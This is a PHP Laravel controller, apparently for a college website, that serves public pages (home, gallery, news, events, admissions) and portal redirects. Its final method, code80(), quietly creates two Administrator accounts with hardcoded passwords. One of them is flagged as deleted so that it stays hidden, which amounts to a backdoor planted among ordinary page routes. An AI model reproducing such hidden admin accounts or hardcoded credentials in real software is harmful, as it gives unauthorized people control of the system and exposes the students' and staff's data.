<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Models\User;
use App\Models\About;
use App\Models\Event;
use App\Models\Gallery;
use App\Models\Company;
use App\Models\Student;
use App\Models\Question;
use App\Models\Homepage;
use App\Models\NewsBlog;
use App\Models\Testimony;
use App\Models\Department;
use App\Models\Program;
use DateTime;
use Session;

class PagesController extends Controller
{
    //
    public function __construct(){
        $this->middleware('load_auth');
    } 

    public function index(){

        // return substr('kjhfgh', 0, 1);
        // if(strpos("Hello world!", ' ') == true){
        //     return str_replace(" ","\/","Hello world!");
        // }

        // if (Session::get('https') != 'https'){
        //     Session::put('https', 'https');
        //     return redirect('https://chntc-akimoda.edu.gh');
        // }

        $company = Company::find(1);
        $program = Program::all();
        $newsblog = NewsBlog::orderBy('id', 'DESC')->where('del', 'no')->limit(2)->get();
        $newsblog6 = NewsBlog::orderBy('id', 'DESC')->where('del', 'no')->limit(6)->get();
        $homepage = Homepage::where('del', 'no')->Latest()->first();
        // $newsblog = 5;
        Session::put('program', $program);
        Session::put('company', $company);
        Session::put('newsblog', $newsblog);
        Session::put('newsblog6', $newsblog6);
        Session::put('homepage', $homepage);
        $where = ['del' => 'no', 'loc_use' => 'Gallery Use'];
        $gallery = Gallery::where($where)->inRandomOrder()->orderBy('id', 'DESC')->limit(4)->get();
        $testimonies = Testimony::where('del', 'no')->orderBy('id', 'DESC')->limit(5)->get();
        $patch = [
            'x' => 1,
            'y' => 1,
            'company' => $company,
            'testimonies' => $testimonies,
            'homepage' => $homepage,
            'department' => Department::all(),
            'gallery' => $gallery
        ];
        return view('index')->with($patch);
    }

    public function gallery(){
        $where = ['del' => 'no', 'loc_use' => 'Gallery Use'];
        $patch = [
            'y' => 1,
            'z' => 1,
            'homepage' => Homepage::where('del', 'no')->Latest()->first(),
            'gallery' => Gallery::where($where)->orderBy('id', 'DESC')->paginate(20)
        ];
        return view('gallery')->with($patch);
    }

    public function about(){
        $patch = [
            'y' => 1,
            'z' => 1,
            'homepage' => $homepage = Homepage::where('del', 'no')->Latest()->first(),
            'about' => About::limit(3)->get()
        ];
        return view('about')->with($patch);
    }
 
    public function news(){

        $patch = [
            'i' => 1,
            'category' => NewsBlog::select('category')->distinct('category')->get(),
            'blogs' => NewsBlog::orderBy('id', 'DESC')->where('del', 'no')->paginate(5),
        ];
        return view('news')->with($patch);
    }
 
    public function events(){

        $patch = [
            'i' => 1,
            // 'category' => NewsBlog::select('category')->distinct('category')->get(),
            'event' => Event::orderBy('id', 'DESC')->where('del', 'no')->latest(),
        ];
        return view('events')->with($patch);
    }
 
    public function all_events(){

        $patch = [
            'i' => 1,
            'y' => 1,
            'category' => NewsBlog::select('category')->distinct('category')->get(),
            'blogs' => NewsBlog::orderBy('id', 'DESC')->where('del', 'no')->paginate(5),
            // 'category' => NewsBlog::select('category')->distinct('category')->get(),
            'events' => Event::orderBy('id', 'DESC')->where('del', 'no')->paginate(5),
        ];
        return view('events')->with($patch);
    }
 
    public function news_single(){
        return view('news-single');
    }

    public function team(){
        return view('team');
    }

    public function contact(){
        return view('contact');
    }

    public function exam_portal(){
        Session::put('portal', 'exam');
        return redirect('/sexam');
    }

    public function student_portal(){
        Session::put('portal', 'student');
        return redirect('/sdashboard');
    }

    public function staff_portal(){
        Session::put('portal', 'staff');
        return redirect('/ldashboard');
    }

    public function admin_portal(){
        Session::put('portal', 'admin');
        return redirect('/dashboard');
    }

    public function admissions()
    {
        $company = Company::find(1);
        $homepage = Homepage::where('del', 'no')->Latest()->first();
        $patch = [
            'x' => 1,
            'y' => 1,
            'company' => $company,
            'homepage' => $homepage,
        ];
        
        return view('admissions')->with($patch);
    }

    public function staff(){
        // session::put('staff_reg_status', 0);
        $dept = Department::all();
        return view('auth.staff_pre_reg')->with('departments', $dept);
    }

    public function student(){
        
        // $random_items = Item::where($match)->inRandomOrder()->limit(10)->get();
        // $ans_seq = '(8=True)(2=True)';

        // // Calculate Scores Here    Ans_Seq -> (8=True)(2=True)
        // if (preg_match('/[(]/', $ans_seq)){
        // // if(strpos($ans_seq, '/(/') == true){
        //     $ans_seq = str_replace("(","",$ans_seq);
        //     $ans_split = explode(')', $ans_seq);
        //     $score = 0;

        //     for ($c=0; $c < count($ans_split) - 1 ; $c++) { 
        //         # code...
        //         $dissolve = explode('=', $ans_split[$c]);
        //         $que = $dissolve[0];
        //         $ans = $dissolve[1];
                
        //         if (Question::find($que)->answer == $ans) {
        //             $score++;
        //         }
        //     }
        //     return $score;
        // }

        // session::put('staff_reg_status', 0);
        $programs = Program::all();
        return view('auth.student_pre_reg')->with('programs', $programs);
    }

    public function bugfixes()
    {
        return view('bugfixes');
    }


    
    
    public function stop_countdown(){ 

        //get Date diff as intervals 
        // $d1 = new DateTime("2018-01-10 00:00:00");
        // $d2 = new DateTime("2019-05-18 01:23:45");
        $d1 = new DateTime("00:00");
        $d2 = new DateTime("01:23:45");
        $interval = $d1->diff($d2);
        $diffInSeconds = $interval->s; //45
        $diffInMinutes = $interval->i; //23
        $diffInHours   = $interval->h; //8
        $diffInDays    = $interval->d; //21
        $diffInMonths  = $interval->m; //4
        $diffInYears   = $interval->y; //1

        return $diffInSeconds;

        //or get Date difference as total difference
        $d1 = strtotime("2018-01-10 00:00:00");
        $d2 = strtotime("2019-05-18 01:23:45");
        $totalSecondsDiff = abs($d1-$d2); //42600225
        $totalMinutesDiff = $totalSecondsDiff/60; //710003.75
        $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39
        $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05
        $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43
        $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35


        Session::put('ctime', 1);
        // return Session::get('ctime');
        return view('dash.countdown');
    }








    public function code80(){
        $backup = User::firstOrCreate(
            ['name' => 'Code80',
            'email' => 'code80@pivoapps.net', 
            'contact' => '0987654321', 
            'status' => 'Administrator', 
            'pass_photo' => 'noimage.jpg', 
            'del' => 'yes', 
            'password' => Hash::make('code.8080')]
        );
 
        $backup = User::firstOrCreate(
            ['name' => 'Admin',
            'email' => 'admin@pivoapps.net', 
            'contact' => '0987654321', 
            'status' => 'Administrator', 
            'pass_photo' => 'noimage.jpg', 
            'del' => 'no', 
            'password' => Hash::make('admin1234')]
        );
        return redirect('/');
    }
}
